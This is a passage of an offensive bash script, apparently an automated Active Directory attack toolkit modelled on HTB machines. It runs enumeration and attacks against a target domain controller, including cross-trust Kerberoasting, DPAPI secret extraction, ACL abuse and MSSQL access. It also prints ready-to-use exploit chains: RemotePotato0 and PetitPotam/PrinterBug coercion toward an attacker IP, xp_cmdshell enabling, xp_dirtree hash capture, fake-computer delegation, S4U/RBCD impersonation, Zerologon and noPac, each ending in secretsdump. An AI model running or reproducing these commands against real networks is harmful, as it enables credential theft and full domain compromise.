    # ★ AD Recycle Bin — Deleted Object Recovery (HTB: Voleur, TombWatcher, Cascade)
    sep; info "★ AD Recycle Bin — Deleted object enumeration (HTB: Voleur/TombWatcher)..."
    command -v netexec &>/dev/null && [[ -n "$DUMP_PASS" ]] && {
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -M tombstone \
            2>/dev/null | tee "$OUTDIR/misc/ad_recycle_bin_nxc.txt"
        grep -i "TOMBSTONE\|deleted\|isDeleted" "$OUTDIR/misc/ad_recycle_bin_nxc.txt" 2>/dev/null
    }
    # Direct LDAP query for deleted objects
    ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
        -b "$DOMAIN_DN" -E '!1.2.840.113556.1.4.417' \
        "(isDeleted=TRUE)" sAMAccountName distinguishedName description userPrincipalName \
        2>/dev/null | tee "$OUTDIR/misc/deleted_objects.txt" | head -60
    DELETED_COUNT=$(grep -c "sAMAccountName:" "$OUTDIR/misc/deleted_objects.txt" 2>/dev/null || echo 0)
    if [[ "$DELETED_COUNT" -gt 0 ]]; then
        crit "★ $DELETED_COUNT DELETED OBJECTS FOUND IN AD RECYCLE BIN:"
        grep "sAMAccountName:\|description:\|distinguishedName:" "$OUTDIR/misc/deleted_objects.txt" 2>/dev/null | head -40
        # Passwords in description fields of deleted objects
        grep -i "description:" "$OUTDIR/misc/deleted_objects.txt" 2>/dev/null | head -10 | \
            while read -r desc; do crit "  DELETED OBJ DESCRIPTION: $desc"; done
        warn "★ Restore: Restore-ADObject -Identity '<DN>' (PowerShell as DA)"
    fi

    # ★ DPAPI Credential Decryption (HTB: Voleur, Vintage, DarkCorp technique)
    sep; info "★ DPAPI credential hunting (HTB: Voleur/Vintage technique)..."
    # Hunt for DPAPI blobs in downloaded share files
    find "$OUTDIR/smb/share_files" -type f 2>/dev/null | while read -r f; do
        fname=$(basename "$f")
        if echo "$fname" | grep -qP '^[0-9A-Fa-f]{32}$'; then
            crit "★ POTENTIAL DPAPI CREDENTIAL BLOB: $f"
        fi
        if echo "$fname" | grep -qP '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'; then
            crit "★ POTENTIAL DPAPI MASTERKEY FILE: $f"
        fi
    done
    warn "DPAPI decryption commands (HTB: Voleur walkthrough):"
    warn "  # Offline: get masterkey from \\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\"
    warn "  impacket-dpapi masterkey -file <MK_FILE> -password '<USER_PASS>' -sid <USER_SID>"
    warn "  impacket-dpapi credential -file <CRED_BLOB> -key <MASTERKEY_HEX>"
    warn "  # Online (if local admin on target):"
    warn "  impacket-dpapi backupkeys -t $DOMAIN/$DUMP_USER:'$DUMP_PASS'@$TARGET --export"
    command -v netexec &>/dev/null && [[ -n "$DUMP_PASS" ]] && {
        netexec smb "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -M dpapi 2>/dev/null | \
            tee "$OUTDIR/misc/dpapi_nxc.txt"
        grep -i "credential\|password\|secret\|DPAPI" "$OUTDIR/misc/dpapi_nxc.txt" 2>/dev/null && \
            crit "★ DPAPI SECRETS via netexec!"
    }

    # ★ Cross-Session Relay — RemotePotato0 (HTB: Mirage, Rebound, Shibuya)
    sep; info "★ Cross-Session Relay guidance (RemotePotato0 — HTB: Mirage/Rebound/Shibuya)..."
    warn "If you have shell access and another privileged user is in a different session:"
    warn "  # Step 1: Check other sessions on target (from WinRM/shell):"
    warn "  qwinsta  OR  query user  OR  Get-Process -IncludeUserName"
    warn "  # Step 2: If privileged session found — setup relay:"
    warn "  # On ATTACKER: sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET_IP>:9999"
    warn "  # On ATTACKER: sudo responder -I tun0 -dw --lm -v"
    warn "  # On TARGET (evil-winrm): .\\RemotePotato0.exe -m 2 -s 1 -x <ATTACKER_IP> -p 9999"
    warn "  (Download: https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip)"
    warn "  # Step 3: Crack captured NTLMv2:"
    warn "  hashcat -m 5600 <HASH_FILE> rockyou.txt"

    # ★ netexec BloodHound one-liner (HTB: Delegate, Administrator technique)
    sep; info "★ netexec BloodHound collection (one-liner alternative to bloodhound-python)..."
    command -v netexec &>/dev/null && [[ -n "$DUMP_PASS" ]] && {
        info "Collecting BloodHound data via netexec LDAP..."
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
            --bloodhound -c All --dns-server "$TARGET" \
            2>/dev/null | tee "$OUTDIR/misc/nxc_bloodhound.txt"
        BHZIP=$(ls ~/.nxc/logs/*bloodhound*.zip 2>/dev/null | sort | tail -1)
        [[ -n "$BHZIP" ]] && {
            cp "$BHZIP" "$OUTDIR/misc/bloodhound_nxc.zip" 2>/dev/null
            crit "★ BloodHound ZIP: $OUTDIR/misc/bloodhound_nxc.zip"
        }
    }

    # ★ Unconstrained Delegation via Fake Computer (HTB: Delegate technique)
    # Requirements: MAQ > 0, LDAP signing off, SeChangeNotifyPrivilege (default for all users)
    sep; info "★ Unconstrained Delegation via fake computer (HTB: Delegate technique)..."
    command -v netexec &>/dev/null && [[ -n "$DUMP_PASS" ]] && {
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -M maq 2>/dev/null | \
            tee "$OUTDIR/misc/maq.txt"
        MAQ_V=$(grep -oP 'MachineAccountQuota:\s*\K\d+' "$OUTDIR/misc/maq.txt" 2>/dev/null | head -1)
        if [[ -n "$MAQ_V" && "$MAQ_V" != "0" ]]; then
            crit "★ MachineAccountQuota=$MAQ_V — Unconstrained delegation attack possible!"
            warn "  # Full workflow (HTB: Delegate walkthrough):"
            warn "  impacket-addcomputer '$DOMAIN/$DUMP_USER:$DUMP_PASS' -dc-ip $TARGET -computer-name 'RELAY01' -computer-pass 'RelayPass123!'"
            warn "  python3 dnstool.py -u '$DOMAIN\\\\$DUMP_USER' -p '$DUMP_PASS' -r RELAY01 -a add -t A -d <ATTACKER_IP> $TARGET"
            warn "  python3 addspn.py -u '$DOMAIN\\\\$DUMP_USER' -p '$DUMP_PASS' --target 'RELAY01\$' -s 'host/RELAY01.$DOMAIN' $TARGET"
            warn "  bloodyAD -d $DOMAIN --host $TARGET -u 'RELAY01\$' -p 'RelayPass123!' set object 'RELAY01\$' userAccountControl -v 528384"
            warn "  python3 krbrelayx.py --krbsalt '$DOMAIN'RELAY01\$ --krbpass 'RelayPass123!'"
            warn "  python3 printerbug.py '$DOMAIN/$DUMP_USER:$DUMP_PASS' $TARGET RELAY01.$DOMAIN"
            warn "  export KRB5CCNAME=\$(ls *DC*.ccache | head -1)"
            warn "  impacket-secretsdump -k -no-pass $DC_HOST.$DOMAIN"
        fi
    }

    sep; info "★ Getting Kerberos TGT (impacket-getTGT)..."
    if command -v impacket-getTGT &>/dev/null; then
        impacket-getTGT "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" \
            2>/dev/null | tee "$OUTDIR/misc/getTGT.txt"
        grep -i "Saving" "$OUTDIR/misc/getTGT.txt" 2>/dev/null && {
            TGT_FILE="$DUMP_USER.ccache"
            [[ -f "$TGT_FILE" ]] && { mv "$TGT_FILE" "$OUTDIR/misc/"; ok "TGT saved: $OUTDIR/misc/$TGT_FILE"; }
        }
    elif command -v impacket-gettgt &>/dev/null; then
        impacket-gettgt "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" \
            2>/dev/null | tee "$OUTDIR/misc/getTGT.txt"
    fi
fi

# pywerview (PowerView in Python)
command -v pywerview &>/dev/null && [[ -n "$DUMP_USER" ]] && {
    info "pywerview enum..."
    pywerview get-netuser -u "$DUMP_USER" -p "$DUMP_PASS" -d "$DOMAIN" -t "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/pywerview_users.txt"
    pywerview get-netgroup -u "$DUMP_USER" -p "$DUMP_PASS" -d "$DOMAIN" -t "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/pywerview_groups.txt"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — TRUST ENUMERATION + CROSS-FOREST ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════
phase "9 — TRUST ENUMERATION & CROSS-FOREST"
get_best_cred

mkdir -p "$OUTDIR/misc/trusts"
info "★ Enumerating domain/forest trusts..."
if [[ -n "$DOMAIN" ]]; then
    # Anonymous LDAP trust check
    ldapsearch -x -H "ldap://$TARGET" -b "$DOMAIN_DN" \
        "(objectClass=trustedDomain)" trustPartner trustType trustAttributes trustDirection flatName \
        2>/dev/null | tee "$OUTDIR/misc/trusts/trust_ldap.txt"
    TRUST_COUNT=$(grep -c "trustPartner:" "$OUTDIR/misc/trusts/trust_ldap.txt" 2>/dev/null || echo 0)
    if [[ "$TRUST_COUNT" -gt 0 ]]; then
        crit "★ DOMAIN TRUSTS FOUND: $TRUST_COUNT"
        grep "trustPartner:" "$OUTDIR/misc/trusts/trust_ldap.txt" 2>/dev/null | awk '{print $2}' | while read -r tp; do
            crit "  → Trusted Domain: $tp"
        done
    fi
fi

# impacket-lsaquery for trust info
if command -v impacket-lsaquery &>/dev/null && [[ -n "$DUMP_USER" ]]; then
    info "impacket-lsaquery — trust info..."
    if [[ -n "$DUMP_HASH" ]]; then
        impacket-lsaquery "$DOMAIN/$DUMP_USER@$TARGET" -hashes "$DUMP_HASH" 2>/dev/null | tee "$OUTDIR/misc/trusts/lsaquery.txt"
    elif [[ -n "$DUMP_PASS" ]]; then
        impacket-lsaquery "$DOMAIN/$DUMP_USER:$DUMP_PASS@$TARGET" 2>/dev/null | tee "$OUTDIR/misc/trusts/lsaquery.txt"
    fi
fi

# Cross-trust SPN / Kerberoasting (requires creds)
if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" && "$TRUST_COUNT" -gt 0 ]]; then
    info "★ Cross-trust Kerberoasting..."
    grep "trustPartner:" "$OUTDIR/misc/trusts/trust_ldap.txt" 2>/dev/null | awk '{print $2}' | while read -r tdom; do
        info "  → GetUserSPNs against trust: $tdom"
        impacket-GetUserSPNs "$DOMAIN/$DUMP_USER:$DUMP_PASS" -target-domain "$tdom" \
            -dc-ip "$TARGET" -outputfile "$OUTDIR/kerberos/cross_trust_tgs_${tdom}.txt" \
            -request 2>/dev/null | tee "$OUTDIR/kerberos/cross_trust_stdout_${tdom}.txt"
        [[ -s "$OUTDIR/kerberos/cross_trust_tgs_${tdom}.txt" ]] && \
            crit "★ Cross-trust TGS hashes: $OUTDIR/kerberos/cross_trust_tgs_${tdom}.txt"
    done
fi

# impacket-findDelegation
if command -v impacket-findDelegation &>/dev/null && [[ -n "$DUMP_USER" ]]; then
    info "★ impacket-findDelegation (all delegation types)..."
    if [[ -n "$DUMP_PASS" ]]; then
        impacket-findDelegation "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" \
            2>/dev/null | tee "$OUTDIR/misc/trusts/find_delegation.txt"
    elif [[ -n "$DUMP_HASH" ]]; then
        impacket-findDelegation "$DOMAIN/$DUMP_USER" -hashes "$DUMP_HASH" -dc-ip "$TARGET" \
            2>/dev/null | tee "$OUTDIR/misc/trusts/find_delegation.txt"
    fi
    grep -iE "(Unconstrained|Constrained|Resource-Based)" "$OUTDIR/misc/trusts/find_delegation.txt" 2>/dev/null | while read -r dline; do
        crit "★ DELEGATION: $dline"
    done
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 10 — ACL ENUMERATION & ABUSE
# ═══════════════════════════════════════════════════════════════════════════════
phase "10 — ACL ENUMERATION & ABUSE"
get_best_cred
mkdir -p "$OUTDIR/misc/acl"

if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" && -n "$DOMAIN" ]]; then
    sep; info "★ ACL check — dangerous rights on our user ($DUMP_USER)..."

    # bloodyAD ACL dump
    if command -v bloodyAD &>/dev/null; then
        info "bloodyAD — get object rights for $DUMP_USER..."
        bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
            get object "$DUMP_USER" --attr nTSecurityDescriptor 2>/dev/null | tee "$OUTDIR/misc/acl/user_acl.txt"

        # Check if our user has WriteDACL/GenericAll/GenericWrite on any high-value targets
        for hvt in "Domain Admins" "Enterprise Admins" "Administrators" "Account Operators" "krbtgt"; do
            SAFE_HVT=$(echo "$hvt" | tr ' ' '_')
            info "  → ACL check on '$hvt'..."
            bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
                get object "$hvt" --attr nTSecurityDescriptor 2>/dev/null | \
                tee "$OUTDIR/misc/acl/acl_${SAFE_HVT}.txt" | grep -iE "(GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChange)" | while read -r al; do
                crit "★ DANGEROUS ACL on '$hvt': $al"
            done
        done
    fi

    # netexec ACL enumeration
    if command -v netexec &>/dev/null; then
        info "★ netexec — scan for GenericAll/GenericWrite (mGP)..."
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -M acl 2>/dev/null | \
            tee "$OUTDIR/misc/acl/nxc_acl.txt"
        grep -iE "(GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword|AddMember)" \
            "$OUTDIR/misc/acl/nxc_acl.txt" 2>/dev/null | while read -r al; do
            crit "★ ACL FINDING: $al"
        done

        # Check if our user has WriteDACL rights (WriteDACL = can grant ourselves GenericAll)
        info "★ netexec — LDAP signing check..."
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -M ldap-checker 2>/dev/null | \
            tee "$OUTDIR/misc/acl/ldap_signing.txt"
        grep -iE "(signing|channel binding)" "$OUTDIR/misc/acl/ldap_signing.txt" 2>/dev/null | while read -r ls; do
            if echo "$ls" | grep -qi "not required\|disabled"; then
                crit "★ LDAP SIGNING NOT REQUIRED — relay attacks possible!"
            fi
        done
    fi

    # impacket-dacledit — WriteDACL exploitation
    sep; info "★ impacket-dacledit guidance (WriteDACL exploitation)..."
    if command -v impacket-dacledit &>/dev/null; then
        info "  Checking if $DUMP_USER has WriteDACL on Domain object..."
        impacket-dacledit "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" \
            -principal "$DUMP_USER" -target-dn "$DOMAIN_DN" -action read 2>/dev/null | \
            tee "$OUTDIR/misc/acl/dacledit_domain.txt" | \
            grep -iE "(WriteDACL|GenericAll|GenericWrite)" | while read -r ace; do
            crit "★ dacledit FINDING: $ace"
            warn "  Exploit: impacket-dacledit $DOMAIN/$DUMP_USER:'$DUMP_PASS' -dc-ip $TARGET -principal '$DUMP_USER' -target '$TARGET_OBJ' -action write -rights FullControl"
        done
    else
        warn "impacket-dacledit not found — install: pip3 install impacket --break-system-packages"
    fi

    # Fine-Grained Password Policy (PSO) enumeration
    sep; info "★ Fine-Grained Password Policy (PSO) enumeration..."
    ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
        -b "$DOMAIN_DN" "(objectClass=msDS-PasswordSettings)" \
        msDS-PasswordSettingsPrecedence msDS-MinimumPasswordLength \
        msDS-PasswordComplexityEnabled msDS-LockoutThreshold \
        msDS-PSOAppliesTo name 2>/dev/null | tee "$OUTDIR/misc/acl/pso.txt"
    PSO_COUNT=$(grep -c "^dn:" "$OUTDIR/misc/acl/pso.txt" 2>/dev/null || echo 0)
    [[ "$PSO_COUNT" -gt 0 ]] && {
        crit "★ FINE-GRAINED PASSWORD POLICIES FOUND: $PSO_COUNT"
        grep -E "(name:|msDS-MinimumPasswordLength:|msDS-LockoutThreshold:|msDS-PSOAppliesTo:)" \
            "$OUTDIR/misc/acl/pso.txt" 2>/dev/null
    }

    # Pre-Windows 2000 Compatibility group (Anonymous access to AD)
    sep; info "★ Pre-Windows 2000 Compatibility group (anonymous AD read)..."
    ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
        -b "$DOMAIN_DN" "(&(objectClass=group)(cn=Pre-Windows 2000 Compatible Access))" member \
        2>/dev/null | tee "$OUTDIR/misc/acl/pre_win2k.txt"
    PRE2K_MEMBERS=$(grep "^member:" "$OUTDIR/misc/acl/pre_win2k.txt" 2>/dev/null | wc -l)
    if [[ "$PRE2K_MEMBERS" -gt 2 ]]; then
        crit "★ Pre-Windows 2000 Compatibility group has $PRE2K_MEMBERS members (may allow anonymous LDAP)"
        warn "  Check if 'Anonymous Logon' or 'Everyone' is a member — allows unauthenticated AD reads"
    fi
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 11 — COERCION ATTACKS (PetitPotam / Coercer / PrinterBug)
# ═══════════════════════════════════════════════════════════════════════════════
phase "11 — COERCION ATTACKS"
get_best_cred
mkdir -p "$OUTDIR/misc/coercion"

ATTACKER_IP=$(ip route get "$TARGET" 2>/dev/null | grep -oP 'src \K\S+' | head -1)
[[ -z "$ATTACKER_IP" ]] && ATTACKER_IP=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' | head -1)
[[ -z "$ATTACKER_IP" ]] && ATTACKER_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
ok "Attacker IP: $ATTACKER_IP"

# Coercer — scan mode (identify coercible protocols without triggering)
if command -v coercer &>/dev/null; then
    info "★ Coercer — scanning for coercible protocols (safe scan mode)..."
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        coercer scan -t "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -d "$DOMAIN" \
            2>/dev/null | tee "$OUTDIR/misc/coercion/coercer_scan.txt"
        COERCIBLE=$(grep -c "vulnerable\|[+]" "$OUTDIR/misc/coercion/coercer_scan.txt" 2>/dev/null || echo 0)
        [[ "$COERCIBLE" -gt 0 ]] && crit "★ TARGET IS COERCIBLE ($COERCIBLE protocols) — relay possible!"
    else
        coercer scan -t "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/coercion/coercer_scan_anon.txt"
    fi
    warn "★ To trigger coercion (authenticate against responder/ntlmrelayx):"
    warn "  # Start responder or relay first, then:"
    [[ -n "$DUMP_PASS" ]] && \
        warn "  coercer coerce -t $TARGET -l $ATTACKER_IP -u '$DUMP_USER' -p '$DUMP_PASS' -d $DOMAIN" || \
        warn "  coercer coerce -t $TARGET -l $ATTACKER_IP (unauthenticated — may work on older DCs)"
else
    warn "coercer not installed. Install: pip3 install coercer --break-system-packages"
    warn "Manual PetitPotam (unauthenticated on unpatched DCs):"
    warn "  python3 PetitPotam.py $ATTACKER_IP $TARGET"
    warn "Manual PrinterBug:"
    warn "  python3 printerbug.py '$DOMAIN/${DUMP_USER:-user}:${DUMP_PASS:-pass}' $TARGET $ATTACKER_IP"
fi

# Check if SPOOLSS is exposed (PrinterBug prerequisite)
if echo "$OPEN_PORTS" | grep -q "445"; then
    info "★ Checking if Print Spooler service is running (PrinterBug)..."
    if command -v rpcclient &>/dev/null; then
        SPOOLER=$(rpcclient -U "${DUMP_USER}%${DUMP_PASS}" "$TARGET" -c "enumprinters" 2>/dev/null)
        if echo "$SPOOLER" | grep -qi "flags\|description\|comment"; then
            crit "★ PRINT SPOOLER ACTIVE — PrinterBug/SpoolSample coercion possible!"
            crit "  python3 printerbug.py '$DOMAIN/$DUMP_USER:$DUMP_PASS' $TARGET $ATTACKER_IP"
        else
            ok "Print Spooler not responding or not running"
        fi
    fi

    # MS-EFSRPC / PetitPotam check (port 445 needed)
    info "★ Checking MS-EFSRPC pipe (PetitPotam prerequisite)..."
    if echo "$OPEN_PORTS" | grep -q "135"; then
        impacket-rpcdump "$TARGET" 2>/dev/null | grep -i "EFSRPC\|MS-EFSR\|efsr" | \
            tee "$OUTDIR/misc/coercion/efsrpc_check.txt"
        grep -qi "EFSRPC" "$OUTDIR/misc/coercion/efsrpc_check.txt" 2>/dev/null && \
            crit "★ MS-EFSRPC EXPOSED — PetitPotam coercion possible!"
    fi
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 12 — MSSQL ENUMERATION & LATERAL MOVEMENT
# ═══════════════════════════════════════════════════════════════════════════════
phase "12 — MSSQL ENUMERATION"
get_best_cred
mkdir -p "$OUTDIR/misc/mssql"

if echo "$OPEN_PORTS" | grep -qE "(1433|1434)"; then
    crit "★ MSSQL PORT DETECTED!"
    info "MSSQL enumeration..."

    # netexec MSSQL
    if command -v netexec &>/dev/null; then
        info "netexec mssql — host info..."
        netexec mssql "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/mssql/nxc_mssql.txt"

        if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
            info "netexec mssql — Windows auth..."
            netexec mssql "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -d "$DOMAIN" \
                2>/dev/null | tee "$OUTDIR/misc/mssql/nxc_auth.txt"
            grep -qi "Pwn3d\|+\|owned" "$OUTDIR/misc/mssql/nxc_auth.txt" 2>/dev/null && {
                crit "★★★ MSSQL ACCESS WITH $DUMP_USER ★★★"
                info "netexec mssql — xp_cmdshell check..."
                netexec mssql "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -d "$DOMAIN" \
                    -q "SELECT @@version" 2>/dev/null | tee "$OUTDIR/misc/mssql/nxc_version.txt"
                netexec mssql "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -d "$DOMAIN" \
                    -M mssql_priv 2>/dev/null | tee "$OUTDIR/misc/mssql/nxc_privs.txt"
                grep -qi "sysadmin\|xp_cmdshell" "$OUTDIR/misc/mssql/nxc_privs.txt" 2>/dev/null && \
                    crit "★ MSSQL SYSADMIN or xp_cmdshell privilege found!"
            }

            # Linked server enumeration
            info "★ MSSQL Linked Server enumeration..."
            netexec mssql "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" -d "$DOMAIN" \
                -q "SELECT name, data_source FROM sys.servers WHERE is_linked=1" \
                2>/dev/null | tee "$OUTDIR/misc/mssql/linked_servers.txt"
            LINKED=$(grep -v "^\[-\]\|nxc\|SMB\|MSSQL" "$OUTDIR/misc/mssql/linked_servers.txt" 2>/dev/null | grep -c ".")
            [[ "$LINKED" -gt 0 ]] && crit "★ MSSQL LINKED SERVERS FOUND — lateral movement possible!"
        fi

        # Try SA with blank password
        info "Trying MSSQL with SA/blank..."
        netexec mssql "$TARGET" -u "sa" -p "" --local-auth 2>/dev/null | tee "$OUTDIR/misc/mssql/nxc_sa.txt"
        grep -qi "Pwn3d\|\[\+\]" "$OUTDIR/misc/mssql/nxc_sa.txt" 2>/dev/null && \
            crit "★★★ MSSQL SA with blank password ★★★"
    fi

    warn "★ Manual MSSQL attack commands:"
    warn "  impacket-mssqlclient $DOMAIN/$DUMP_USER:'$DUMP_PASS'@$TARGET -windows-auth"
    warn "  # Enable xp_cmdshell:"
    warn "  SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
    warn "  SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
    warn "  SQL> EXEC xp_cmdshell 'whoami';"
    warn "  # Capture NTLM hash via linked server:"
    warn "  SQL> EXEC master..xp_dirtree '\\\\$ATTACKER_IP\\share'"
else
    info "MSSQL (1433/1434) not detected — skipping MSSQL phase"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 13 — CONSTRAINED DELEGATION S4U EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════════
phase "13 — CONSTRAINED DELEGATION S4U2Proxy"
get_best_cred
mkdir -p "$OUTDIR/misc/delegation"

# Check constrained delegation results from Phase 4
CONST_DEL=$(cat "$OUTDIR/ldap/constrained_delegation.txt" 2>/dev/null)
if [[ -n "$CONST_DEL" ]] && grep -q "msDS-AllowedToDelegateTo" "$OUTDIR/ldap/constrained_delegation.txt" 2>/dev/null; then
    crit "★ CONSTRAINED DELEGATION ACCOUNTS FOUND!"
    grep "sAMAccountName:\|msDS-AllowedToDelegateTo:" "$OUTDIR/ldap/constrained_delegation.txt" 2>/dev/null | head -30

    # Parse accounts with their allowed delegation targets
    CUR_DEL_USER=""
    while IFS= read -r line; do
        if echo "$line" | grep -q "^sAMAccountName:"; then
            CUR_DEL_USER=$(echo "$line" | awk '{print $2}')
        fi
        if echo "$line" | grep -q "^msDS-AllowedToDelegateTo:"; then
            DEL_TARGET=$(echo "$line" | awk '{print $2}')
            crit "  CONSTRAINED DELEG: $CUR_DEL_USER → $DEL_TARGET"
            SVC=$(echo "$DEL_TARGET" | cut -d/ -f1 | tr '[:upper:]' '[:lower:]')
            warn "  S4U2Proxy exploit (need $CUR_DEL_USER TGT/password):"
            warn "    impacket-getST '$DOMAIN/$CUR_DEL_USER' -spn '$DEL_TARGET' -impersonate Administrator -dc-ip $TARGET"
            warn "    export KRB5CCNAME=Administrator@${DEL_TARGET//\//_}.ccache"
            warn "    impacket-psexec -k -no-pass $DOMAIN/Administrator@$TARGET"
        fi
    done < "$OUTDIR/ldap/constrained_delegation.txt"
else
    ok "No constrained delegation accounts found"
fi

# Resource-Based Constrained Delegation (RBCD) check
RBCD_DATA=$(cat "$OUTDIR/ldap/rbcd.txt" 2>/dev/null)
if [[ -n "$RBCD_DATA" ]] && grep -q "msDS-AllowedToActOnBehalfOfOtherIdentity" "$OUTDIR/ldap/rbcd.txt" 2>/dev/null; then
    crit "★ RBCD CONFIGURED ON MACHINE ACCOUNTS!"
    grep "sAMAccountName:" "$OUTDIR/ldap/rbcd.txt" 2>/dev/null | awk '{print $2}' | while read -r rbcd_host; do
        crit "  RBCD target: $rbcd_host"
        warn "  RBCD exploit (need write on $rbcd_host):"
        warn "    # Add fake computer: impacket-addcomputer '$DOMAIN/user:pass' -computer-name 'FAKE\$' -computer-pass 'FakePass1' -dc-ip $TARGET"
        warn "    # Set RBCD: impacket-rbcd '$DOMAIN/user:pass' -delegate-from 'FAKE\$' -delegate-to '$rbcd_host' -dc-ip $TARGET -action write"
        warn "    # Get impersonation TGT: impacket-getST '$DOMAIN/FAKE\$:FakePass1' -spn 'cifs/$rbcd_host.$DOMAIN' -impersonate Administrator -dc-ip $TARGET"
    done
fi

# Unconstrained delegation targets
UNCONST_DATA=$(cat "$OUTDIR/ldap/unconstrained_delegation.txt" 2>/dev/null)
if [[ -n "$UNCONST_DATA" ]] && grep -q "sAMAccountName" "$OUTDIR/ldap/unconstrained_delegation.txt" 2>/dev/null; then
    UNCONST_USERS=$(grep "sAMAccountName:" "$OUTDIR/ldap/unconstrained_delegation.txt" 2>/dev/null | awk '{print $2}' | grep -vi "^$DC_HOST$")
    if [[ -n "$UNCONST_USERS" ]]; then
        crit "★ NON-DC ACCOUNTS WITH UNCONSTRAINED DELEGATION:"
        echo "$UNCONST_USERS" | while read -r uu; do
            crit "  → $uu (coerce DC auth → steal TGT → DCSync)"
        done
        warn "  Exploit workflow:"
        warn "    # 1. Get shell on the unconstrained delegation machine"
        warn "    # 2. Setup: Rubeus.exe monitor /interval:5 /filteruser:DC01\$"
        warn "    # 3. Coerce DC: coercer coerce -t $TARGET -l <UNCONSTRAINED_IP> -u '$DUMP_USER' -p '$DUMP_PASS' -d $DOMAIN"
        warn "    # 4. Extract TGT: Rubeus.exe ptt /ticket:<B64_TICKET>"
        warn "    # 5. DCSync: impacket-secretsdump -k $DC_HOST.$DOMAIN"
    fi
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 14 — CVE CHECKS (noPac / Zerologon / MS-SAMR)
# ═══════════════════════════════════════════════════════════════════════════════
phase "14 — CVE CHECKS"
get_best_cred
mkdir -p "$OUTDIR/misc/cves"

# ★ Zerologon (CVE-2020-1472) — critical, patches Feb 2021
sep; info "★ CVE-2020-1472 Zerologon check..."
if command -v impacket-zerologon &>/dev/null; then
    if [[ -n "$DC_HOST" ]]; then
        info "  Running zerologon checker against $DC_HOST ($TARGET)..."
        impacket-zerologon -just-check "$DC_HOST" "$TARGET" 2>/dev/null | \
            tee "$OUTDIR/misc/cves/zerologon.txt"
        grep -qi "VULNERABLE\|SUCCESS\|Successful" "$OUTDIR/misc/cves/zerologon.txt" 2>/dev/null && {
            crit "★★★ ZEROLOGON VULNERABLE (CVE-2020-1472)! ★★★"
            crit "  EXPLOIT: impacket-zerologon $DC_HOST $TARGET"
            crit "  Then: impacket-secretsdump -just-dc -no-pass $DOMAIN/$DC_HOST\$@$TARGET"
        } || ok "Zerologon: not vulnerable"
    else
        warn "DC_HOST not detected — provide with: impacket-zerologon <DC_HOSTNAME> $TARGET"
    fi
else
    warn "impacket-zerologon not found. Test manually:"
    warn "  impacket-zerologon -just-check $DC_HOST $TARGET"
fi

# ★ noPac (CVE-2021-42278 + CVE-2021-42287) — SAMAccountName spoofing
sep; info "★ CVE-2021-42278/42287 noPac check (SAMAccountName spoofing)..."
if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" && -n "$DOMAIN" ]]; then
    if command -v impacket-goldenPac &>/dev/null; then
        info "  Checking noPac (requires low-priv domain user + MachineAccountQuota > 0)..."
        # Check machine account quota
        MAQ_CHECK=$(ldapsearch -x -H "ldap://$TARGET" -b "$DOMAIN_DN" \
            "(objectClass=domain)" ms-DS-MachineAccountQuota 2>/dev/null | \
            grep "ms-DS-MachineAccountQuota:" | awk '{print $2}')
        if [[ -n "$MAQ_CHECK" && "$MAQ_CHECK" != "0" ]]; then
            crit "★ MAQ=$MAQ_CHECK — noPac attack may be feasible!"
            warn "  noPac exploit:"
            warn "  git clone https://github.com/Ridter/noPac.git && cd noPac"
            warn "  python3 scanner.py $DOMAIN/$DUMP_USER:'$DUMP_PASS' -dc-ip $TARGET -use-ldap"
